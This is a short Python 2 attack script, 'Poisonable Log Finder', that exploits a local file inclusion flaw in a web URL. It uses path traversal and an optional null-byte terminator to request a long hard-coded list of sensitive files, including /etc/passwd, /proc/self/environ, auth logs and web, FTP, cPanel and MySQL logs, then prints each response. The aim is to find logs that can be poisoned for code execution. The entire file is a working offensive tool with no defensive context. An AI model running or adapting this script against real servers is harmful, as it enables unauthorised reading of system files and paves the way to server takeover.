#!/usr/bin/python
#Poisonable Log Finder V1.1 20170926
import sys
from StringIO import StringIO
import pycurl

if len(sys.argv) < 2 or len(sys.argv) > 3:
        print "Usage: PoisonableLogFinder.py \"root LFI URI\" \"optional terminator\""
	print "E.g. PoisonableLogFinder.py \"http://192.168.1.10/vuln/index.php?path=../../../../../../\" \"%00\""
        sys.exit(0)

if len(sys.argv) == 2:
	termination = " "
else:
	termination = sys.argv[2]

URI = sys.argv[1]
LOGS = ["etc/passwd",
"proc/self/environ",
"apache2/logs/access.log",
"apache2/logs/error_log",
"apache2/logs/error.log",
"apache/logs/access_log",
"apache/logs/access.log",
"apache2/logs/access_log",
"var/log/apache2/access.log",
"var/log/apache2/access_log",
"etc/httpd/logs/access_log",
"etc/httpd/logs/access.log",
"etc/httpd/logs/error_log",
"etc/httpd/logs/error.log",
"var/log/apache/error_log",
"var/log/apache2/error_log",
"var/log/apache/error.log",
"var/log/apache2/error.log",
"var/log/error_log",
"var/log/error.log",
"var/www/logs/error_log",
"var/www/logs/error.log",
"var/log/auth.log",
"etc/apache2/sites-available/default",
"etc/apache2/vhosts.d/default_vhost.include",
"etc/httpd/logs/acces_log",
"etc/httpd/logs/acces.log",
"logs/access_log",
"logs/access.log",
"opt/lampp/logs/access_log",
"opt/lampp/logs/access.log",
"opt/lampp/logs/error_log",
"opt/lampp/logs/error.log",
"opt/xampp/logs/access_log",
"opt/xampp/logs/access.log",
"opt/xampp/logs/error_log",
"opt/xampp/logs/error.log",
"etc/logrotate.d/ftp",
"etc/logrotate.d/httpd",
"etc/logrotate.d/proftpd",
"etc/logrotate.d/vsftpd.log",
"usr/local/apache2/logs/access_log",
"usr/local/apache2/logs/access.log",
"usr/local/apache2/logs/error_log",
"usr/local/apache/logs/access_log",
"usr/local/apache/logs/access_ log",
"usr/local/apache/logs/access.log",
"usr/local/apache/logs/access. log",
"usr/local/apache/logs/error_log",
"usr/local/apache/logs/error.log",
"usr/local/cpanel/logs",
"usr/local/cpanel/logs/access_log",
"usr/local/cpanel/logs/error_log",
"usr/local/cpanel/logs/license_log",
"usr/local/cpanel/logs/login_log",
"usr/local/cpanel/logs/stats_log",
"usr/local/www/logs/thttpd_log",
"var/log/access_log",
"var/log/access.log",
"var/log/apache/access_log",
"var/log/apache/access.log",
"var/log/apache-ssl/access.log",
"var/log/apache-ssl/error.log",
"var/log/auth",
"var/log/authlog",
"var/log/ftplog",
"var/log/ftp-proxy",
"var/log/ftp-proxy/ftp-proxy.log",
"var/log/httpd/access_log",
"var/log/httpd/access.log",
"var/log/httpd/error_log",
"var/log/httpd/error.log",
"var/log/httpsd/ssl.access_log",
"var/log/httpsd/ssl_log",
"var/log/lighttpd",
"var/log/mysqlderror.log",
"var/log/mysqld.log",
"var/log/mysql.log",
"var/log/mysql/mysql-bin.log",
"var/log/mysql/mysql.log",
"var/log/mysql/mysql-slow.log",
"var/log/proftpd.access_log",
"var/log/pureftpd.log",
"var/log/pure-ftpd/pure-ftpd.log",
"var/log/thttpd_log",
"var/log/vsftpd.log",
"var/www/log/access_log",
"var/www/log/error_log",
"var/www/logs/access_log",
"var/www/logs/access.log",
"var/log/httpd-access.log",
"var/log/httpd-error.log",
"www/logs/proftpd.system.log",]
for log in LOGS:
	buffer = StringIO()
	c = pycurl.Curl()
	c.setopt(c.URL, '{0}{1}{2}'.format(URI,log,termination))
	c.setopt(c.WRITEDATA, buffer)
	c.perform()
	c.close()

	body = buffer.getvalue()
	print("******************************************")
	print("TESTING: {0}{1}".format(log,termination))
	print("******************************************")
	print(body)
